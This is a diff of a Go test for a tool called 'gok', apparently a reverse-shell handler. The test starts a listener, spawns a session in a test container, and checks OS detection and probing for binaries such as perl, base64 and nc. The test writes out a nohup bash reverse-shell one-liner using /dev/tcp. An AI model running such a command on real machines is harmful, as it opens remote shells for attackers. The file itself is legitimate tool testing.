@@ -11,7 +11,7 @@ import (
 )
 
 func TestRevshellSimple(t *testing.T) {
-  // adjust test delay
+  // time start
 
   // start gok core 
   hostIP := "0.0.0.0"     // Bind gok to listen on all interfaces
@@ -19,12 +19,14 @@ func TestRevshellSimple(t *testing.T) {
   hostPort := 9001
 
   // Start gok core in headless/test mode
+  probingCmdTimeout := 50 * time.Millisecond
   cfg := Config{
     PortRange: PortRange{ Ports: []int{hostPort} },
     bindIps:   []string{hostIP},
     // NOTE: Test/Headless mode
     HeadlessMode: true,
-    ProbingCmdTimeout: 200 * time.Millisecond,
+    // Should be enough for test environment
+    ProbingCmdTimeout: probingCmdTimeout,
   }
   core := NewCore(cfg)
   go core.Start()
@@ -34,45 +36,50 @@ func TestRevshellSimple(t *testing.T) {
 
   // start revshell in test container
   revCmd := fmt.Sprintf("nohup bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1' >/dev/null 2>&1 &", connectIP, hostPort)
-  _ , err := tc.Exec(t, []string{"bash", "-c", revCmd})
-  if err != nil {
-    t.Fatal(err)
+  _ , rerr := tc.Exec(t, []string{"bash", "-c", revCmd})
+  if rerr != nil {
+    t.Fatal(rerr)
   }
+
 
   // TEST: Session lands
   require.Eventually(t, func() bool {
     sessions := core.SessionManager.GetSessions()
     return len(sessions) == 1
-  }, 2*time.Second, 50*time.Millisecond, "Expected one session to be established")
+  }, 1*time.Second, 2*time.Millisecond, "Expected one session to be established")
 
 
   // TEST: OS of Session should be Linux
+  var s *Session
+  var err error
   require.Eventually(t, func() bool {
-    s, err := core.SessionManager.Get(0)
+    s, err = core.SessionManager.Get(0)
     if err != nil { return false }
     s.mu.Lock()
     defer s.mu.Unlock()
     return s.SystemInfo.OS == Linux
-  }, 2*time.Second, 100*time.Millisecond, "Expected session OS to be Linux")
+  }, 1*time.Second, 2*time.Millisecond, "Expected session OS to be Linux")
 
 
   // Wait for Prober to be initialized
   require.Eventually(t, func() bool {
-    s, err := core.SessionManager.Get(0)
-    if err != nil { return false }
-    // Ideally we should lock, but checking for non-nil is atomic enough for this test check
     s.mu.Lock()
     defer s.mu.Unlock()
     return s.state == StateBackgrounded && s.Prober != nil
-  }, 20*time.Second, 100*time.Millisecond, "Timed out waiting for Prober initialization")
+  }, 5*time.Second, 20*time.Millisecond, "Timed out waiting for Prober initialization")
 
 
   // TEST: Binaries: `which`, `perl` should be detected
-  s, err := core.SessionManager.Get(0)
-  require.NoError(t, err)
+  // require.NoError(t, err)
   binaries := s.Prober.getBinaries()
   require.Contains(t, binaries, "which", "Expected 'which' binary to be detected")
-  require.Contains(t, binaries, "perl", "Expected 'python3' binary to be detected")
+  require.Contains(t, binaries, "perl", "Expected 'perl' binary to be detected")
+  require.Contains(t, binaries, "base64", "Expected 'base64' binary to be detected")
+  require.Contains(t, binaries, "find", "Expected 'find' binary to be detected")
+  require.Contains(t, binaries, "grep", "Expected 'grep' binary to be detected")
+  // Does not not contain:
+  require.NotContains(t, binaries, "nonexistentbinary123", "Did not expect 'nonexistentbinary123' binary to be detected")
+  require.NotContains(t, binaries, "nc", "Did not expect 'nc' binary to be detected")
 
 }
 
